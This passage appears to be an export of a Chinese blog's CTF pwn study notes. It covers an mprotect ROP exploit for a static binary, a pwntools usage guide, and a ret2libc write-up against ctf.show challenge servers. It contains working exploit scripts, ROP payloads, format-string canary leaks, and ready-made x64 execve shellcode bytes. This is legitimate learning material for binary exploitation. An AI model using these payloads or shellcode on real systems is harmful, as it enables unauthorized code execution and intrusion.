class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28134</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mprotect_addr=elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">shellcode = asm(shellcraft.sh())    </span><br><span class="line">pop_eax_edx_ebx_addr=<span class="number">0x08056194</span></span><br><span class="line">got_plt_addr=<span class="number">0x080DA000</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>)+p32(mprotect_addr)+p32(pop_eax_edx_ebx_addr)+p32(got_addr)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">payload+=p32(read_addr)+p32(got_addr)+p32(<span class="number">0</span>)+p32(got_addr)+p32(<span class="number">0x1000</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>题目提示mprotect函数，checksc发现开启了NX和canany(实际上没开canany因为checksec的版本过低)，file发现程序是静态链接，IDA发现栈溢出漏洞</p><p>gdb调试vmmap查看段属性</p><p><img src="/../images/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/1.png" alt="1"></p><p>发现0x80d8000–0x80dc000段可读写但是不可执行因为是静态链接所以程序中有很多函数，包括mprotect函数，故目前思路为利用mprotect函数修改0x80d8000–0x80dc000段其中一部分为可执行，在该部分填入shell绕过NX</p><p>IDA中Ctrl+s查看段表</p><p><img src="/../images/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/got_plt.png" alt="1"></p><p><img src="/../images/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/bass.png" alt="1"></p><p>此处选择起始地址为got.plt段首地址(#区间开始的地址start必须是一个内存页的起始地址(地址的后三位为0，0x1000&#x3D;4096u)</p><p>len设置为0x1000(够写入shell且为内存页大小的整数倍)</p><p>port设置为7</p><p>因为程序是静态链接的所以有很多ROPgadgets</p><p>在设置payload时用完mportect函数还需要写入read函数来输入shell故需要用3个pop1个ret来“跨过”mportect的参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;pop&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/ROP.png" alt="1"></p><p>因为32位程序是栈传参所以不用管pop到的寄存器，只是为了跳过三个参数ret到read函数上</p><p>故payload设置为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>)+p32(mprotect_addr)+p32(pop_eax_edx_ebx_addr)+p32(got_addr)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line">payload+=p32(read_addr)+p32(got_addr)+p32(<span class="number">0</span>)+p32(got_addr)+p32(<span class="number">0x1000</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools</title>
      <link href="/2024/12/01/pwntools/"/>
      <url>/2024/12/01/pwntools/</url>
      
        <content type="html"><![CDATA[<h1 id="pwntools的使用"><a href="#pwntools的使用" class="headerlink" title="pwntools的使用"></a>pwntools的使用</h1><p>该板块会持续更新，学一点写一点</p><p>学习资料来源于：<a href="https://www.cnblogs.com/XiDP0/p/18445564">1</a></p><h3 id="导入pwntools库"><a href="#导入pwntools库" class="headerlink" title="导入pwntools库"></a>导入pwntools库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br></pre></td></tr></table></figure><h3 id="设置基本信息"><a href="#设置基本信息" class="headerlink" title="设置基本信息"></a>设置基本信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>os</code>是靶机的操作系统类型</p><p><code>arch</code>是题目的架构，一般是AMD64(64位)或i386(32位)</p><p><code>log_level</code>是指日志输出等级，设置为debug可以在脚本运行时输出我们具体发送了什么信息，靶机反馈了什么信息。</p><h3 id="连接远程靶机"><a href="#连接远程靶机" class="headerlink" title="连接远程靶机"></a>连接远程靶机</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = remote(<span class="string">&quot;ip&quot;</span>,port)<span class="comment">#前者为靶机地址，后者为端口号</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = ssh(host=<span class="string">&#x27;ip&#x27;</span>,user=<span class="string">&#x27;用户名&#x27;</span>,port=端口号,password=<span class="string">&#x27;密码&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="发送信息"><a href="#发送信息" class="headerlink" title="发送信息"></a>发送信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.send(payload) <span class="comment"># 直接发送payload</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload) <span class="comment"># 发送payload，但是结尾会有一个\n</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;string&quot;</span>, payload) <span class="comment"># 接收到 string (这里说的string可以替换成任何信息) 之后会发送payload，但是如果没有接收到string，那么就会导致脚本一直卡在这里不动</span></span><br><span class="line"></span><br><span class="line">p.sendlineafer(<span class="string">&quot;string&quot;</span>, payload) <span class="comment"># 接收到 string 之后会发送payload 并且在payload最后添加\n</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="接收信息"><a href="#接收信息" class="headerlink" title="接收信息"></a>接收信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">p.recv(<span class="built_in">int</span>) <span class="comment">#利用recv来接收返回的数据，并且可以控制接受到的字节数</span></span><br><span class="line">比如:p.recv(<span class="number">7</span>) =&gt; 系统输出<span class="string">&#x27;hello world&#x27;</span> =&gt; 我们会接受到<span class="string">&#x27;hello w&#x27;</span> </span><br><span class="line"></span><br><span class="line">p.recvline(<span class="string">&#x27;string&#x27;</span>) <span class="comment">#设置一个标识符，接收标识符所在的那一行</span></span><br><span class="line">比如:p.recvline(<span class="string">&#x27;O.o&#x27;</span>)</span><br><span class="line"><span class="comment">#系统输出:</span></span><br><span class="line">Hello World </span><br><span class="line">This <span class="keyword">is</span> a test. </span><br><span class="line">O.o This <span class="keyword">is</span> the target line. </span><br><span class="line">Goodbye.</span><br><span class="line"><span class="comment">#我们接收:</span></span><br><span class="line">O.o This <span class="keyword">is</span> the target line.</span><br><span class="line"></span><br><span class="line">p.recvlines(N) 接收 N 行输出</span><br><span class="line">比如：p.recvlines(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#系统输出</span></span><br><span class="line">Hello World </span><br><span class="line">This <span class="keyword">is</span> a test. </span><br><span class="line">O.o This <span class="keyword">is</span> the target line. </span><br><span class="line">Goodbye.</span><br><span class="line"><span class="comment">#我们接收</span></span><br><span class="line">Hello World </span><br><span class="line">This <span class="keyword">is</span> a test. </span><br><span class="line">O.o This <span class="keyword">is</span> the target line. </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;string&#x27;</span>) 可以指定接收到某一字符串的时候停止 ,还有第二个参数 drop，drop=<span class="literal">True</span>(默认为false) 表示丢弃设定的停止符号</span><br><span class="line">比如:p.recvuntil(<span class="string">&#x27;or&#x27;</span>) </span><br><span class="line"><span class="comment">#系统输出:</span></span><br><span class="line">hello world </span><br><span class="line"><span class="comment">#我们接收:</span></span><br><span class="line">hello wor  </span><br><span class="line">比如:a = io.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">就是一直获取到`]`符号出现就停止，并且不接收`]`符号</span><br></pre></td></tr></table></figure><p>常用接收地址：</p><p>64位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write_addrs=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>32位：</p><p>elf基址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - main</span><br><span class="line">info(<span class="string">&#x27;elf_base:&#x27;</span>+<span class="built_in">hex</span>(elf_base))</span><br></pre></td></tr></table></figure><p>libc基址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts_addrs=u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment">#puts_addrs=u32(io.recv()[0:4])</span></span><br></pre></td></tr></table></figure><p>接收canary：</p><p>%p输出指针地址:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.send(b&#x27;%23$p&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;0x&#x27;)</span><br><span class="line">canary=int(io.recv(8),16)</span><br><span class="line">print(b&#x27;canary&gt;&gt;&gt;&#x27;+hex(canary))</span><br></pre></td></tr></table></figure><p>%x(用于以十六进制形式输出无符号整数。):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = b&#x27;%31$x&#x27; </span><br><span class="line">recvbytes = io.recv()</span><br><span class="line">canary = int(recvbytes, 16)</span><br><span class="line">print(f&#x27;Canary: &#123;hex(canary)&#125;&#x27;)</span><br></pre></td></tr></table></figure><h3 id="开启交互"><a href="#开启交互" class="headerlink" title="开启交互"></a>开启交互</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#接受信息并且在终端操作，程序拿到shell，然后就可以转接到linux终端上.</span></span><br></pre></td></tr></table></figure><h3 id="构造发送地址类型"><a href="#构造发送地址类型" class="headerlink" title="构造发送地址类型"></a>构造发送地址类型</h3><p><code>p64/p32/u64/u32</code>这类函数的作用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p64(<span class="built_in">int</span>) </span><br><span class="line">p64(<span class="number">0xfaceb00c</span>) =&gt; <span class="string">&#x27;\x0c\xb0\xce\xfa\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">u64(<span class="built_in">str</span>) </span><br><span class="line">u64(<span class="string">&#x27;\x0c\xb0\xce\xfa\x00\x00\x00\x00&#x27;</span>) =&gt;<span class="number">0xfaceb00c</span></span><br><span class="line"></span><br><span class="line">p32(<span class="built_in">int</span>)  </span><br><span class="line">p32(<span class="number">0xfaceb00c</span>) =&gt; <span class="string">&#x27;\x0c\xb0\xce\xfa&#x27;</span></span><br><span class="line"></span><br><span class="line">u32(<span class="built_in">str</span>) </span><br><span class="line">u32(<span class="string">&#x27;\x0c\xb0\xce\xfa&#x27;</span>) =&gt; <span class="number">0xfaceb00c</span></span><br></pre></td></tr></table></figure><p><code>p64()</code>这种类型用于将消息变成对应的进制流（因为原本程序里面的数据都是已经编译过的，所以打入的数据也需要是编译过的,所以需要使用p64()这类工具）<br><code>u64()</code>这种类型<strong>用于泄露地址</strong>的时候将泄露的进制流变成对应的原本的样子，方便来辨认查找glibc版本</p><p>因为一般计算机都是小端程序，所以这两个函数都自带有将数据变成小端需要的样子，如果遇到大端程序可能需要额外注意</p><p>除了<code>p32()</code>这种转化方式还有，<code>flat()</code>，它可以将多个数据结构（如字符串、整数等）连接在一起，并将它们转换为二进制数据。通常用于构建复杂的ROP链的<code>shellcode</code>。flat 函数会将数据扁平化，将它们按照顺序连接在一起，不做任何其他处理。在提供的代码中，<code>flat</code> 被用于构建一个包含多个元素的列表，然后将它们连接起来形成一个二进制数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([<span class="number">0x12345678</span>, <span class="string">&#x27;AAAA&#x27;</span>, <span class="number">0xdeadbeef</span>], word_size=<span class="number">4</span>/<span class="number">8</span>)</span><br></pre></td></tr></table></figure><h3 id="生成指定大小字符串"><a href="#生成指定大小字符串" class="headerlink" title="生成指定大小字符串"></a>生成指定大小字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic(<span class="number">100</span>)</span><br></pre></td></tr></table></figure><h3 id="汇编于反汇编"><a href="#汇编于反汇编" class="headerlink" title="汇编于反汇编"></a>汇编于反汇编</h3><p>pwntools提供了两个工具:<br><code>asm</code>函数可以将汇编代码转为对应的二进制<br><code>disasm</code>函数则相反可以将二进制转化为汇编代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;mov eax, 0&#x27;</span>)   <span class="comment">#汇编</span></span><br><span class="line"><span class="string">&#x27;\xb8\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>disasm(<span class="string">&#x27;\xb8\x0b\x00\x00\x00&#x27;</span>)  <span class="comment">#反汇编</span></span><br><span class="line"><span class="string">&#x27;mov    eax,0xb&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="生成shellcode后门"><a href="#生成shellcode后门" class="headerlink" title="生成shellcode后门"></a>生成shellcode后门</h3><p>注意对于64位程序使用该函数前需指定架构，默认架构为32位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment"># 表示将当前执行上下文的体系结构设置为i386(这里的i386可以通过checksec来查看文件是什么架构的  </span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># asm()是把括号内的内容编译成机器码(只有机器码才可以执行)，一般用来打入后门。pwntools自带的后门函数，可以生成类似system(&#x27;/bin/sh/&#x27;)这样功能的汇编代码 </span></span><br><span class="line"><span class="comment"># 通常可以配合  .ljust() 来使用  </span></span><br><span class="line">shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>)  </span><br><span class="line"><span class="comment"># 这里的 .ljust() 是 Python 中字符串对象的方法，用于在字符串的右侧填充指定的字符，使字符串达到指定的长度。</span></span><br></pre></td></tr></table></figure><p>纯净版shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>专门收集shellcode的网站：<a href="https://www.exploit-db.com/shellcodes/43550">https://www.exploit-db.com/shellcodes/43550</a></p><p>已编译好的shellcode：</p><p>64位linux的24Byte(字节)的shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x64 =<span class="string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure><p>64位linux的23Byte的shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x64 =<span class="string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br></pre></td></tr></table></figure><p>很多时候我们需要自己手动编写shellcode来绕过一些检测</p><h3 id="运行时使用gdb调试-还需要进一步学习"><a href="#运行时使用gdb调试-还需要进一步学习" class="headerlink" title="运行时使用gdb调试(还需要进一步学习)"></a>运行时使用gdb调试(还需要进一步学习)</h3><p><code>gdb.attach</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p, gdbscript=<span class="string">&quot;&quot;&quot; b main; commands; silent printf &quot;Breakpoint hit\n&quot;; continue; end &quot;&quot;&quot;</span>)</span><br><span class="line">在需要进行调试的位置插入gdb.attach(p)即可在执行到的时候打开gdb进行调试</span><br><span class="line">p是指定的需要调试的进程(必须要本地调试，否则会报错)</span><br><span class="line">gdbscript是打开gdb后需要进行的操作，使用 ; 进行隔离</span><br></pre></td></tr></table></figure><p>一般<code>gdb.attach(p)</code>可以和<code>pause()</code>函数连用，可以确保在gdb完全打开之前脚本不运行<br><code>pause()</code>函数用于暂停脚本的运行，直到用户输入任意数据</p><h3 id="ELF模块"><a href="#ELF模块" class="headerlink" title="ELF模块"></a>ELF模块</h3><p>我们可以通过这个模块来快速获取pwn文件的<code>got表地址</code>以及<code>plt表地址</code><br>用于获取<code>ELF文件的信息</code>，首先使用<code>ELF()</code>获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。<br>下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址，和LibcSearcher库联动使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf.address <span class="comment"># 文件装载的基地址 =&gt; 0x400000</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>] <span class="comment"># 获取函数地址 =&gt; 0x401680</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>] <span class="comment"># 获取对应函数在GOT表的地址 =&gt; 0x60b070</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>] <span class="comment"># 获取对应函数在PLT表的地址 =&gt; 0x401680</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts)<span class="comment">#需要导入LibcSearcher库来匹配对应glibc版本</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2libc</title>
      <link href="/2024/11/30/ret2libc/"/>
      <url>/2024/11/30/ret2libc/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h3><p>libc常用于处理动态链接程序，动态链接：程序在运行或加载时，在内存中完成链接的过程，即系统库和自己编写的代码分割成两个独立的模块，等到程序运行时再将这两个模块进行链接。<strong>详细介绍可以看指南摘要的动态链接部分</strong></p><p>其具有延迟绑定的特点，只有当函数第一次被调用时，动态链接器才进行符号查找、重定位等操作，如果未被调用则不进行绑定</p><p>ELF文件通过过程链接表和GOT的配合来实现延迟绑定，每个被调用的库函数都有一组对应的PLT和GOT。<strong>（plt里存放的是汇编指令，用于跳转到got，got里存放了地址 ）</strong></p><h4 id="工具指令"><a href="#工具指令" class="headerlink" title="工具指令"></a>工具指令</h4><p>ROPgadget</p><p>获取gadget地址，<code>--binary</code>参数指定文件，可以是可执行文件或libc文件，grep用于筛选,<code>--string</code>用于筛选字符串</p><p>通过pop rdi;ret可以将栈地址中的值传给rdi寄存器，其他寄存器同理，故p64(pop_rdi_ret)+p64(rdi_content)即可控制rdi寄存器的值为rdi_content</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ROPgadget</span> --binary pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;rdi&#x27;</span><span class="comment">#控制寄存器的值</span></span><br><span class="line"><span class="variable">$ROPgadget</span> --binary pwn --string <span class="string">&#x27;/bin/sh&#x27;</span><span class="comment">#查找字符串</span></span><br><span class="line"><span class="variable">$ROPgadget</span> --binary pwn --only <span class="string">&#x27;leave|ret&#x27;</span> | grep <span class="string">&#x27;leave&#x27;</span>#查找leave ret指令地址</span><br><span class="line"><span class="variable">$ROPgadget</span> --binary pwn --ropchain<span class="comment">#生成现成的rop利用链直接getshell，适用于静态编译的程序</span></span><br><span class="line"><span class="variable">$ROPgadget</span> --binary pwn --only <span class="string">&#x27;ret&#x27;</span><span class="comment">#查找ret指令的地址</span></span><br></pre></td></tr></table></figure><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><h4 id="pwn45"><a href="#pwn45" class="headerlink" title="pwn45"></a>pwn45</h4><p>分析程序:</p><p>题目提示为无system无&#x2F;bin&#x2F;sh故可尝试ret2shellcode 或 ret2libc</p><p><img src="/../images/ret2libc/cf.png" alt="1"></p><p>开了nx，程序为动态链接(file中的dynamically linked)，分析程序发现bss段没有可以用的变量，有栈溢出漏洞，有puts函数和write函数故可利用ret2libc进行攻击获取shell</p><p>首先第一次控制执行流利用write函数将其got表中的地址输入到输入流中，接着接收该地址将其先转换成整数，再转换为16进制地址供后续利用，函数实际地址&#x3D;函数基地址+偏移，故获得了write函数的地址就相当于获得了函数的基地址</p><p>利用LibcSearcher根据已知的write函数地址搜索对应的libc库，利用libc.dump()获得函数的偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28217</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6B</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write=u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment">#常规获取地址，recvuntil(&#x27;\xf7&#x27;)表示从标准输入中获取数据直到检测到&#x27;\xf7&#x27;地址结尾一般为这个，[-4:]表示从接收末尾4个字节的内容u32()将获取的内容转为整数形式</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line"><span class="comment">#将整数转为16进制形式</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line"><span class="comment">#搜索对应的glibc版本</span></span><br><span class="line">libc_base=write-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"><span class="comment">#获取基地址</span></span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6B</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>write</code> 函数的原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure><ul><li><p><strong>头文件</strong>: <code>unistd.h</code> 是包含 <code>write</code> 函数声明的头文件。</p></li><li><p><strong>返回类型</strong>: <code>ssize_t</code> 是一个有符号整数类型，通常用于表示字节数或错误码。</p></li><li><p>参数</p><p>1.fd: 文件描述符（File Descriptor），表示要写入的目标文件或流。常见的文件描述符包括：</p><ul><li><code>0</code>: 标准输入（stdin）</li><li><code>1</code>: 标准输出（stdout）</li><li><code>2</code>: 标准错误（stderr） 其他正整数值通常是通过打开文件时由系统分配的。例如，通过 <code>open()</code>、<code>creat()</code>、<code>pipe()</code>等函数获取的文件描述符。</li></ul><p>2.<code>buf</code>: 指向要写入数据的缓冲区的指针。这个缓冲区包含了将要写入到目标位置的数据。可以是任何类型的数据，但通常是字符串或其他二进制数据。</p><p>3.<code>count</code>: 